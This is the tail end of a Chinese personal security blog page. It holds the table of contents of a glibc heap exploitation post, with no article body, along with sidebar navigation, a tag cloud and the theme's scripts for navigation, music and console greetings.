anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Glibc-Heap-Exp"><span class="toc-number">1.</span> <span class="toc-text">Glibc Heap Exp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Glibc-Heap-Overview"><span class="toc-number">1.1.</span> <span class="toc-text">Glibc Heap Overview</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GLibc-Heap"><span class="toc-number">1.1.1.</span> <span class="toc-text">GLibc Heap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Heap%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.2.</span> <span class="toc-text">Heap相关的漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Glibc-Heap%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5"><span class="toc-number">1.1.3.</span> <span class="toc-text">Glibc Heap相关概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E8%AF%91glibc2-23%E6%97%B6%E7%9A%84%E4%B8%80%E4%B8%AA%E9%97%AE%E9%A2%98"><span class="toc-number">1.1.4.</span> <span class="toc-text">编译glibc2.23时的一个问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8docker%E6%97%B6%E7%9A%84%E4%B8%80%E4%B8%AA%E9%97%AE%E9%A2%98"><span class="toc-number">1.1.5.</span> <span class="toc-text">使用docker时的一个问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Chunk"><span class="toc-number">1.1.6.</span> <span class="toc-text">Chunk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Chunk-Header%E6%A0%87%E5%BF%97%E4%BD%8D"><span class="toc-number">1.1.7.</span> <span class="toc-text">Chunk Header标志位</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Size-64-bit"><span class="toc-number">1.1.8.</span> <span class="toc-text">Size(64 bit)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Heap%E6%93%8D%E4%BD%9C"><span class="toc-number">1.1.9.</span> <span class="toc-text">Heap操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#free-%E7%9A%84%E4%BE%8B%E5%AD%90"><span class="toc-number">1.1.9.1.</span> <span class="toc-text">free 的例子</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit-UAF"><span class="toc-number">1.2.</span> <span class="toc-text">Exploit:UAF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8chunk%E7%9A%84%E5%9B%9E%E6%94%B6%E7%89%B9%E6%80%A7"><span class="toc-number">1.2.1.</span> <span class="toc-text">利用chunk的回收特性</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastbin-Corruption"><span class="toc-number">1.3.</span> <span class="toc-text">Fastbin Corruption</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin"><span class="toc-number">1.3.1.</span> <span class="toc-text">fastbin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-corruption"><span class="toc-number">1.3.2.</span> <span class="toc-text">fastbin corruption</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fastbin-Sanity-Check"><span class="toc-number">1.3.3.</span> <span class="toc-text">Fastbin Sanity Check</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-double-free"><span class="toc-number">1.3.4.</span> <span class="toc-text">fastbin double free</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Overflow-Freed-chunk"><span class="toc-number">1.3.5.</span> <span class="toc-text">Overflow Freed chunk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Free-Arbitrary-Address-House-of-Spirit"><span class="toc-number">1.3.6.</span> <span class="toc-text">Free Arbitrary Address(House of Spirit)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unlink-Exploitation"><span class="toc-number">1.4.</span> <span class="toc-text">Unlink Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%88%E5%B9%B6-freed-chunks"><span class="toc-number">1.4.1.</span> <span class="toc-text">合并 freed chunks</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unlink-Macro"><span class="toc-number">1.4.2.</span> <span class="toc-text">unlink() Macro</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.3.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Overwrite-Heap-Pointer"><span class="toc-number">1.4.4.</span> <span class="toc-text">Overwrite Heap Pointer</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mmap-chunks"><span class="toc-number">1.5.</span> <span class="toc-text">mmap chunks</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0arena"><span class="toc-number">1.5.1.</span> <span class="toc-text">伪造arena</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/10/22/%E7%94%B1XSS%E5%88%B0%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" title="由XSS到网络安全"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/cover/%E4%BA%91%E5%AE%89%E5%85%A8.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="由XSS到网络安全"/></a><div class="content"><a class="title" href="/2023/10/22/%E7%94%B1XSS%E5%88%B0%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" title="由XSS到网络安全">由XSS到网络安全</a><time datetime="2023-10-21T16:43:57.000Z" title="发表于 2023-10-22 00:43:57">2023-10-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/10/16/%E4%B8%80%E7%A7%8D%E5%9F%BA%E4%BA%8EPE%E6%96%87%E4%BB%B6%E7%9A%84%E4%BF%A1%E6%81%AF%E9%9A%90%E8%97%8F%E6%96%B9%E6%B3%95%E7%9A%84%E7%A0%94%E7%A9%B6%E4%B8%8E%E5%AE%9E%E7%8E%B0/" title="一种基于PE文件的信息隐藏方法的研究与实现（信息隐藏相关）"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/cover/%E4%BF%A1%E6%81%AF%E9%9A%90%E8%97%8F.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="一种基于PE文件的信息隐藏方法的研究与实现（信息隐藏相关）"/></a><div class="content"><a class="title" href="/2023/10/16/%E4%B8%80%E7%A7%8D%E5%9F%BA%E4%BA%8EPE%E6%96%87%E4%BB%B6%E7%9A%84%E4%BF%A1%E6%81%AF%E9%9A%90%E8%97%8F%E6%96%B9%E6%B3%95%E7%9A%84%E7%A0%94%E7%A9%B6%E4%B8%8E%E5%AE%9E%E7%8E%B0/" title="一种基于PE文件的信息隐藏方法的研究与实现（信息隐藏相关）">一种基于PE文件的信息隐藏方法的研究与实现（信息隐藏相关）</a><time datetime="2023-10-16T15:29:03.909Z" title="发表于 2023-10-16 23:29:03">2023-10-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/10/16/%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/" title="一例RAT木马分析"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="一例RAT木马分析"/></a><div class="content"><a class="title" href="/2023/10/16/%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/" title="一例RAT木马分析">一例RAT木马分析</a><time datetime="2023-10-16T15:29:03.908Z" title="发表于 2023-10-16 23:29:03">2023-10-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/10/16/%E7%94%9F%E8%BE%B0%E7%BA%B2%E6%A1%88/" title="生辰纲案"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/cover/%E6%B0%B4%E6%B5%92%E4%BC%A0.avif" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="生辰纲案"/></a><div class="content"><a class="title" href="/2023/10/16/%E7%94%9F%E8%BE%B0%E7%BA%B2%E6%A1%88/" title="生辰纲案">生辰纲案</a><time datetime="2023-10-16T15:29:03.904Z" title="发表于 2023-10-16 23:29:03">2023-10-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/10/16/%E5%8A%A0%E8%A7%A3%E5%AF%86%E7%AC%AC%E4%B8%80%E7%AF%87%E7%AC%94%E8%AE%B0/" title="加密与解密第一篇笔记"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/cover/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="加密与解密第一篇笔记"/></a><div class="content"><a class="title" href="/2023/10/16/%E5%8A%A0%E8%A7%A3%E5%AF%86%E7%AC%AC%E4%B8%80%E7%AF%87%E7%AC%94%E8%AE%B0/" title="加密与解密第一篇笔记">加密与解密第一篇笔记</a><time datetime="2023-10-16T15:29:03.900Z" title="发表于 2023-10-16 23:29:03">2023-10-16</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="http://ivoripuion.github.io" title="Ivoripuion@2023">Ivoripuion@2023</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">80</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">33</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">10</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://ivoripuion.github.io/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://github.com/Ivoripuion" title="米惜的github"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/me.jpg" alt="米惜的github"/><span class="back-menu-item-text">米惜的github</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/BAS/" style="font-size: 0.88rem;">BAS<sup>1</sup></a><a href="/tags/Java%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">Java安全<sup>2</sup></a><a href="/tags/Linux/" style="font-size: 0.88rem;">Linux<sup>5</sup></a><a href="/tags/Windows/" style="font-size: 0.88rem;">Windows<sup>9</sup></a><a href="/tags/blackhat2023-png/" style="font-size: 0.88rem;">blackhat2023.png<sup>1</sup></a><a href="/tags/fuzz/" style="font-size: 0.88rem;">fuzz<sup>6</sup></a><a href="/tags/pwn/" style="font-size: 0.88rem;">pwn<sup>1</sup></a><a href="/tags/web/" style="font-size: 0.88rem;">web<sup>1</sup></a><a href="/tags/%E4%B8%B4%E5%BA%8A/" style="font-size: 0.88rem;">临床<sup>2</sup></a><a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">二进制安全<sup>2</sup></a><a href="/tags/%E4%BA%91%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">云安全<sup>4</sup></a><a href="/tags/%E4%BF%A1%E6%81%AF%E9%9A%90%E8%97%8F/" style="font-size: 0.88rem;">信息隐藏<sup>1</sup></a><a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/" style="font-size: 0.88rem;">内存马<sup>1</sup></a><a href="/tags/%E5%88%91%E6%B3%95/" style="font-size: 0.88rem;">刑法<sup>1</sup></a><a href="/tags/%E5%89%A7%E6%9C%AC%E6%9D%80%E8%A7%A3%E6%9E%90/" style="font-size: 0.88rem;">剧本杀解析<sup>2</sup></a><a href="/tags/%E5%AD%98%E5%9C%A8%E4%B8%BB%E4%B9%89/" style="font-size: 0.88rem;">存在主义<sup>3</sup></a><a href="/tags/%E5%AE%9E%E6%88%98/" style="font-size: 0.88rem;">实战<sup>3</sup></a><a href="/tags/%E5%AE%9E%E8%B7%B5/" style="font-size: 0.88rem;">实践<sup>5</sup></a><a href="/tags/%E5%BC%80%E5%8F%91/" style="font-size: 0.88rem;">开发<sup>1</sup></a><a href="/tags/%E6%96%87%E5%AD%A6%E9%89%B4%E8%B5%8F/" style="font-size: 0.88rem;">文学鉴赏<sup>1</sup></a><a href="/tags/%E6%97%A5%E8%AF%AD/" style="font-size: 0.88rem;">日语<sup>1</sup></a><a href="/tags/%E6%B3%95%E5%AD%A6/" style="font-size: 0.88rem;">法学<sup>1</sup></a><a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" style="font-size: 0.88rem;">漏洞分析<sup>22</sup></a><a href="/tags/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B/" style="font-size: 0.88rem;">病毒检测<sup>2</sup></a><a href="/tags/%E7%AC%94%E8%AE%B0/" style="font-size: 0.88rem;">笔记<sup>54</sup></a><a href="/tags/%E7%B2%BE%E7%A5%9E%E5%88%86%E6%9E%90/" style="font-size: 0.88rem;">精神分析<sup>10</sup></a><a href="/tags/%E8%85%BE%E8%AE%AF%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">腾讯云主机安全<sup>1</sup></a><a href="/tags/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/" style="font-size: 0.88rem;">论文阅读<sup>1</sup></a><a href="/tags/%E9%80%86%E5%90%91/" style="font-size: 0.88rem;">逆向<sup>12</sup></a><a href="/tags/%E9%9A%8F%E7%AC%94/" style="font-size: 0.88rem;">随笔<sup>3</sup></a><a href="/tags/%E9%9D%9E%E9%81%93%E5%BE%B7%E4%B8%BB%E4%B9%89/" style="font-size: 0.88rem;">非道德主义<sup>1</sup></a><a href="/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/" style="font-size: 0.88rem;">面试题<sup>1</sup></a><a href="/tags/%E9%A9%AC%E5%85%8B%E6%80%9D%E4%B8%BB%E4%B9%89/" style="font-size: 0.88rem;">马克思主义<sup>3</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8030065748" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random"></meting-js></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://music.163.com/#/playlist?id=8030065748&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.20/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.4/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("01/01/2022 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2022 By 安知鱼 V1.6.8",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 Ivoripuion 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script>var visitorMail = "visitor@anheyu.com";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><script id="click-heart" src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="false"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"left","width":225,"height":450},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>